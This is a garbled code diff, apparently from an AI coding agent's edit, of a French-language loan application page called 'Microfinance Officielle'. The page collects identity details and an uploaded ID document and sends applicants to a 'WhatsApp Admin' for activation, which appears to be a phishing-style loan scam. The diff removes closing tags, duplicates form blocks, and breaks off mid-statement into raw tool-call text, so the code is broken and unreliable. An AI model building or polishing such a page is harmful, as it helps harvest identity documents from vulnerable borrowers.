@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Microfinance Officielle - Demande de prêt</title>
+<title>Microfinance Officielle - Demande de pr&ecirc;t</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
@@ -68,12 +68,9 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Z" stroke="rgba(0,0,0,.35)" stroke-width="1.5"/><path d="M8.3 15.2c.8.9 2 1.6 3.7 1.6 2.3 0 3.8-1.2 3.8-3 0-1.6-1.2-2.4-3-2.7l-1.5-.3c-.9-.2-1.5-.6-1.5-1.3 0-.8.7-1.4 1.9-1.4 1 0 1.8.4 2.4 1.1" stroke="rgba(0,0,0,.35)" stroke-width="1.7" stroke-linecap="round"/></svg>
       </div>
       <div><h1>Microfinance Officielle</h1><p>Demande de pr&ecirc;t &bull; Traitement rapide</p></div>
-    </div>
     <div class="pillbar">
       <div class="pill">D&eacute;lai : <strong>24h</strong></div>
       <div class="pill">Confidentialit&eacute; : <strong>assur&eacute;e</strong></div>
-    </div>
-  </div>
   </header>
   <div class="grid">
     <section class="card" style="min-height:760px;">
@@ -86,11 +83,21 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <h2 style="font-size:18px">Informations personnelles</h2>
         <p>Remplissez le formulaire. Une fois soumis, activez votre dossier via WhatsApp.</p>
         <div class="steps">
-          <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div></div>
-          <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div></div></div>
+          <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div>
+          <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div>
       <form id="loanForm">
         <p class="sectionTitle">Informations utilisateur</p>
         <div id="formSteps">
+          <div class="formPage" data-page="1">
+            <div class="formGrid">
+              <div class="full"><label>Email (obligatoire)</label><input name="email" type="email" required></div>
+              <div class="full"><label>Nom complet (obligatoire)</label><input name="fullName" type="text" required placeholder="Nom et pr&eacute;nom"></div>
+              <div class="full"><label>Date de naissance (obligatoire)</label><input name="birthDate" type="date" required></div>
+              <div class="full"><label>Adresse (obligatoire)</label><input name="address" type="text" required placeholder="Quartier / Commune"></div>
+              <div class="full"><label>T&eacute;l&eacute;phone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
+              <div class="full"><label>Type de document</label><select name="idDoc" required><option value="CNI">CNI</option><option value="Passeport">Passeport</option><option value="Permis">Permis</option><option value="Autre">Autre</option></select></div>
+              <div class="full"><label>Document d'identit&eacute; (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
+            <div class="pageNav">
           <div class="formPage" data-page="1">
             <div class="formGrid">
               <div class="full"><label>Email (obligatoire)</label><input name="email" type="email" required></div>
@@ -167,8 +174,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
           <h3>Activation dossier</h3>
           <div class="muted">Apr&egrave;s validation, un conseiller active votre cr&eacute;dit.</div>
           <div class="whatsapp">
-            <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div></div>
-          </div>
+            <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div>
           <div class="miniItem" style="border-color:rgba(96,165,250,.35);background:rgba(96,165,250,.07)">
             <div class="t">&#128274; Acc&egrave;s Administrateur</div>
             <div class="s">Voir les r&eacute;ponses utilisateurs</div>
@@ -176,9 +182,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <button class="btnSecondary" type="button" onclick="showAdmin()">Entrer Admin</button>
               <button class="btnSecondary" type="button" onclick="clearLocalDemo()">Effacer d&eacute;mo</button>
             </div>
-          </div>
-        </div>
-      </div>
     </aside>
   </div>
 
@@ -193,8 +196,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Z" stroke="rgba(0,0,0,.35)" stroke-width="1.5"/><path d="M8.3 15.2c.8.9 2 1.6 3.7 1.6 2.3 0 3.8-1.2 3.8-3 0-1.6-1.2-2.4-3-2.7l-1.5-.3c-.9-.2-1.5-.6-1.5-1.3 0-.8.7-1.4 1.9-1.4 1 0 1.8.4 2.4 1.1" stroke="rgba(0,0,0,.35)" stroke-width="1.7" stroke-linecap="round"/></svg>
       </div>
       <div><h1>Panel Administrateur</h1><p>Consultation des r&eacute;ponses</p></div>
-    <div class="pillbar"><div class="pill">Acc&egrave;s : <strong>Restreint</strong></div></div>
-  </div>
+    <div class="pillbar"><div class="pill">Acc&egrave;s : <strong>Restreint</strong></div>
   </header>
 
   <div class="grid">
@@ -217,7 +219,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
             <button class="btnSecondary" type="button" onclick="backPublic()">&larr; Vue publique</button>
             <button class="btnSecondary" type="button" onclick="logoutAdmin()">D&eacute;connexion</button>
           </div>
-        </div>
         <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap">
           <input id="filterEmail" placeholder="Filtrer par email" style="flex:1;min-width:200px;padding:10px;border-radius:10px;border:1px solid var(--border);background:rgba(255,255,255,.06);color:var(--text);outline:none">
           <button class="btnSecondary" type="button" onclick="renderResponses()">Actualiser</button>
@@ -225,14 +226,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <div style="margin-top:12px;border:1px solid var(--border);border-radius:14px;overflow:hidden">
           <div style="display:grid;grid-template-columns:1.2fr .8fr 1fr 70px;padding:10px 14px;border-bottom:1px solid var(--border);color:var(--muted);font-size:13px;font-weight:700;background:rgba(255,255,255,.03)">
             <div>Email</div><div>T&eacute;l&eacute;phone</div><div>Montant</div><div style="text-align:center">Action</div>
-          </div>
           <div id="responsesTable" style="max-height:400px;overflow:auto"></div>
-        </div>
         <div class="miniItem" style="margin-top:12px">
           <div class="t" id="detailTitle">D&eacute;tail</div>
           <div class="s" id="detailBody" style="white-space:pre-wrap;margin-top:6px;font-size:13px;color:var(--muted)">S&eacute;lectionnez une r&eacute;ponse.</div>
-        </div>
-      </div>
     </section>
   </div>
 
@@ -264,6 +261,12 @@ function loadAuth(){return localStorage.getItem(AUTH_KEY)==='1'}
 function saveAuth(){localStorage.setItem(AUTH_KEY,'1')}
 function clearAuth(){localStorage.removeItem(AUTH_KEY)}
 
+function togglePanel(){
+  const p=document.getElementById('rightPanelCollapse');
+  if(!p)return;
+  p.classList.toggle('isClosed');
+  p.classList.toggle('isOpen');
+}
 function showAdmin(){
   const publicView=document.getElementById('publicView');
   const adminView=document.getElementById('adminView');
@@ -509,56 +512,28 @@ function showDetail(r){
     fetch('/api/response/'+r.id,{headers:{'Authorization':'Bearer '+tok}})
       .then(function(res){return res.json()})
       .then(function(d){if(d.success&&d.submission)renderDetail(d.submission)})
-      .catch(function(err){console.warn('Erreur chargement détail:',err)});
-  } else if(!tok) {
-    renderDetail(r);
-  }
-}
-function renderDetail(r){
-  var s='';
-  for(var k in r){
-    if(k==='idDocFileBase64')continue;
-    s+=k+': '+(r[k]||'-')+'\n';
-  }
-  document.getElementById('detailBody').textContent=s||'Aucun detail.';
-}
-async function deleteRow(id,email){
-  if(!id||!email)return;
-  if(!confirm('Supprimer la reponse de '+email+' ?'))return;
-  var tok=localStorage.getItem('admin_token');
-  if(tok){
-    try{
-      var res=await fetch('/api/delete',{
-        method:'DELETE',
-        headers:{'Content-Type':'application/json','Authorization':'Bearer '+tok},
-        body:JSON.stringify({id:id})
-      });
-      var d=await res.json();
-      if(d.success){
-        toast('Supprime','Reponse supprimee.','ok');
-        renderResponses();
-        return;
-      }
-    }catch(e){}
-  }
-  var list=loadResp().filter(function(r){return r.id!==id});
-  saveResp(list);
-  toast('Supprime','Reponse locale supprimee.','ok');
-  renderResponses();
-}
+      .
+<path>
+c:/Users/HP/Downloads/app jores/index.html
+</path>
+<old_str>window.showAdmin=showAdmin;
+window.backPublic=backPublic;
+window.logoutAdmin=logoutAdmin;
+window.renderResponses=renderResponses;
+window.clearLocalDemo=clearLocalDemo;
+window.togglePanel=togglePanel;
+window.deleteRow=deleteRow;</old_str>
+<new_str>window.showAdmin=showAdmin;
+window.backPublic=backPublic;
+window.logoutAdmin=logoutAdmin;
+window.renderResponses=renderResponses;
+window.clearLocalDemo=clearLocalDemo;
 function togglePanel(){
   const p=document.getElementById('rightPanelCollapse');
   if(!p)return;
   p.classList.toggle('isClosed');
   p.classList.toggle('isOpen');
 }
-
-window.nextPage=nextPage;
-window.prevPage=prevPage;
-window.showAdmin=showAdmin;
-window.backPublic=backPublic;
-window.logoutAdmin=logoutAdmin;
-window.renderResponses=renderResponses;
-window.clearLocalDemo=clearLocalDemo;
 window.togglePanel=togglePanel;
-window.deleteRow=deleteRow;
+window.deleteRow=deleteRow;</new_str>
+</edit_file>
